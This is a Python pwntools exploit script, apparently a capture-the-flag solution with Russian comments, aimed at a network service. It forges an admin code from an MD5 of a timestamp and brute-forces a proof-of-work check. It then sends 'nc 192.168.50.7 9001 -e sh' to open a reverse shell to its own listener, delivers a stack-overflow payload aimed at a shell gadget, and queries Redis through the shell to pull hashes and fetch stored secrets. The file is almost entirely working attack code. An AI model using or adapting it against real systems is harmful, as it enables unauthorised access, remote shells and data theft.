#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import string, random, uuid
import os
import socket
import subprocess
import hashlib
import time
from pwn import *

os.environ['PWNLIB_NOTERM'] = 'True'

SERVER_HOST = '0.0.0.0'
SERVER_PORT = 9001

server = socket.socket()
server.bind((SERVER_HOST, SERVER_PORT))


#ip = sys.argv[1]
ip = 'localhost'
port = 8080

def generator(size=24, chars=string.digits + string.ascii_letters):
    return ''.join(random.choice(chars) for _ in range(size))

def find_word(hash):
    while True:
        word = generator()
        m = hashlib.md5()
        m.update(word.encode())
        try_hash = str(m.hexdigest())
        if hash == try_hash[-5:]:
            break
    return word



r = remote(ip, port)

#Находим код от админки
response = r.recvuntil(b'GET <code>\n\n').decode()
magic = response.split('\n\n')[0]
timestamp_str = str(int(time.time()))
combined_str = magic + timestamp_str
result_hash = hashlib.md5(combined_str.encode('utf-8')).hexdigest()
r.sendline(b'/ADMIN ' + result_hash.encode())

#PoW капча - брутфорс
part_hash = r.recvregex('give me a string so that the last 5 characters of the md5 hash = [a-z0-9]{5}').decode()
part_hash = part_hash[-5:]
word = find_word(part_hash)
r.sendline(word.encode())
r.recvuntil(b'\xd0\x9a\xd1\x82\xd0\xbe \xd1\x82\xd1\x8b \xd0\xb2\xd0\xbe\xd0\xb9\xd0\xbd ?\n')

server.listen(1)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

r.sendline(b'nc 192.168.50.7 9001 -e sh')
answer = r.recvrepeat(1).decode()

buffer_size = 136
shell_gadget = 0x0000000000401d04

payload = b'A' * buffer_size
payload += struct.pack("<Q", shell_gadget)

r.sendline(payload)
client_socket, client_address = server.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")
r.close()

# Отправляем команду
command = "echo SCAN 30 | nc redis 6379\n"  # Пример команды; \n важен для ее выполнения в shell
client_socket.send(command.encode())

# Получаем ответ
output = client_socket.recv(4096).decode()

# Закрываем соединение
client_socket.close()
server.close()

md5_pattern = re.compile(r'\b[a-f0-9]{32}\b')
md5_hashes = md5_pattern.findall(output)


if len(md5_hashes) > 0:
    print("MD5 Hashes found:")
    for hash in md5_hashes:
        print(hash)
        r = remote(ip, port)
        response = r.recvuntil(b'GET <code>\n\n').decode()
        r.sendline(b'/GET ' + hash.encode())
        print(r.recv(1024).decode())
        r.close()
else:
    print("MD5 Hashes not found ;(")




